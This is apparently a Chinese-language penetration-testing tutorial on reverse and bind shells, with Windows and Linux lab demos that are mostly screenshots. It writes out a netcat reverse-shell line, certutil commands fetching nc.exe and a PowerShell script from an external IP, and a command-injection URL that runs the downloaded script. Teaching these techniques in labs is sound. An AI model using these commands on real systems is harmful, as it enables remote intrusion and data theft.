---
title: 反弹Shell&渗透命令&Reverse反向&Bind正向&利用语言&文件下载&多姿势
published: 2026-01-22 10:00:00
description: 反弹shell的本质：当防火墙、NAT或数据不回显，还有反弹shell的在线命令生成的平台，以及Windows和Linux双平台反弹shell的演示案例。最后就是如何利用文件下载以及powershell。
tags: [基础入门,反弹shell]
category: 网络安全
draft: true
---

# 知识点

1. [反弹Shell-项目&命令&语言等](#反弹Shell-项目&命令&语言等)
2. [系统渗透命令-网络&文件&操作等](#系统渗透命令-网络&文件&操作等)

## 反弹Shell-项目&命令&语言等

**反弹Shell的前提条件：**

**已知存在的漏洞利用或执行命令的地方。**

###  为什么要反弹Shell

往往由于很多因素如：防火墙的开启限制，端口被占用，无法进行正向连接，数据不回显，攻击者可能无法直接从受攻击系统上建立连接并获取Shell控制权时。

例子：

1. 远程控制：通过反弹shell，攻击者可以远程控制目标系统，执行各种命令和操作，获得对目标系统的完全控制权限。
2. 隐藏攻击痕迹：通过反弹shell，攻击者可以在目标系统上执行命令，而不需要直接与。这样可以减少被发现的风险，同时也可以更好地隐藏攻击者的身份和攻击行为。
3. 横向渗透：一旦攻击者成功反弹shell并获得目标系统的访问权限，他们可以进一步横向渗透，即在网络中移动并攻击其他系统，以获取更多的敏感信息或控制权。
4. 数据盗取和系统破坏：通过反弹shell，攻击者可以获取目标系统上的敏感数据，并且可以操纵系统以造成损害，例如删除文件、破坏系统配置等。

### 反弹Shell

在线生成：

https://sec.lintstar.top/

https://www.revshells.com/

https://forum.ywhack.com/shell.php

命令类别：

1. 开发语言：系统环境变量开发环境。
2. 系统自带：系统支持的系统命令调用。
3. 第三方项目：利用远程下载命令后调用。
4. 正反向类别：Reverse反向、Bind绑定等。

实验环境：

Windows<-->Linux

**如果是Windows<-->Windows，就要考虑到很多问题，比如对方使用的什么脚本语言，脚本语言的版本是什么等等，反弹shell时都会受到这些影响，还有一般反弹shell的语句都是Linux默认的bash shell，语句中一般都是bin/bash，如果是反弹到Windows，需要把这个改为cmd。**

Linux<-->Linux基本上不会出现很多问题。

### 演示案例0-Linux反弹shell到Windows上

#### 系统自带命令

![image-20260121205504380](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260121205504380.png)

![image-20260121205518283](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260121205518283.png)

![image-20260121205533592](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260121205533592.png)

![image-20260121205547160](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260121205547160.png)

![image-20260121205605056](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260121205605056.png)

![image-20260121205614126](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260121205614126.png)

![image-20260121205631271](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260121205631271.png)

#### 开发语言

![image-20260121210403135](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260121210403135.png)

![image-20260121210416214](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260121210416214.png)

![image-20260121210429432](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260121210429432.png)

![image-20260121210441311](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260121210441311.png)

![image-20260121210457435](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260121210457435.png)

#### 正反向类别

![image-20260121210800615](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260121210800615.png)

![image-20260121210810618](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260121210810618.png)

![image-20260121210852925](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260121210852925.png)

##### 课堂正反向小问题

讲课的电脑（属于内网环境）要控制Linux服务器（外网环境），该怎么操作？流程？

这里就把讲课的主机简写为主机A，Linux服务器就是靶机B。

正向连接：靶机B创建端口开启监听，主机A使用nc对靶机B进行连接。

反向连接：需要借助中继服务器。

##### 加深正反向理解

这里为了再次加深理解：

1. 正向连接
   攻击机 → 靶机
   动作：攻击机主动“连”过去
   靶机事先在本地端口监听，攻击机 `nc 靶机IP 端口` 就能拿到 Shell。
2. 反向连接（反弹 Shell）
   靶机 → 攻击机
   动作：靶机主动“打”回来
   攻击机先在公网监听 `nc -lvnp 端口`，靶机执行 `nc -e cmd 攻击机IP 1111`，把 Shell 反送给攻击机。

一句话：正向我去找你，反向你来找我。

### 演示案例1-Windows反弹shell到Linux上

![image-20260122091759113](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260122091759113.png)

![image-20260122091823879](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260122091823879.png)

![image-20260122091844520](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260122091844520.png)

![image-20260122091904440](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260122091904440.png)

![image-20260122091917126](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260122091917126.png)

## 小结

1. Windows上基本就PowerShell命令可以反弹，再就是环境变量的开发语言。
2. Linux上默认自带的nc(ncat)，系统命令，开发语言等基本大部分都可反弹。

## 系统渗透命令-网络&文件&操作等

### 渗透命令

在线参考：

https://book.shentoushi.top/

### 文件下载

在线参考：

https://forum.ywhack.com/bountytips.php?download

![image-20260122093010495](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260122093010495.png)

![image-20260122093018943](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260122093018943.png)

### 演示案例2-文件下载并反弹

在攻击机上放NC工具同时使用python开启WEB服务，让目标从攻击机上下载这个NC工具来判断是否存在漏洞。

![image-20260122093145756](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260122093145756.png)

![image-20260122093156341](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260122093156341.png)

![image-20260122093208918](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260122093208918.png)

![image-20260122093219856](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260122093219856.png)

```bash
certutil.exe -urlcache -split -f http://119.45.92.24:8080/nc.exe nc.exe
```

![image-20260122093231228](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260122093231228.png)

![image-20260122093240455](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260122093240455.png)

![image-20260122093251114](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260122093251114.png)

### 演示案例3-powershell反弹

![image-20260122093602465](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260122093602465.png)

![image-20260122093612678](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260122093612678.png)

![image-20260122093620680](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260122093620680.png)

![image-20260122094250496](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260122094250496.png)

![image-20260122094301009](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260122094301009.png)

![image-20260122094312282](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260122094312282.png)

把这个1.ps1上传到攻击机上并用python开启WEB服务，靶机用文件下载命令下载这个1.ps1保存为11.ps1。

```bash
certutil.exe -urlcache -split -f http://119.45.92.24:8080/1.ps1 11.ps1
```

![image-20260122094659496](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260122094659496.png)

![image-20260122094742000](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260122094742000.png)

执行时需要加上`.\`来运行。

```url
ip/rce.php?c=powershell .\11.ps1
```

![image-20260122094802309](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260122094802309.png)

![image-20260122094918840](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260122094918840.png)
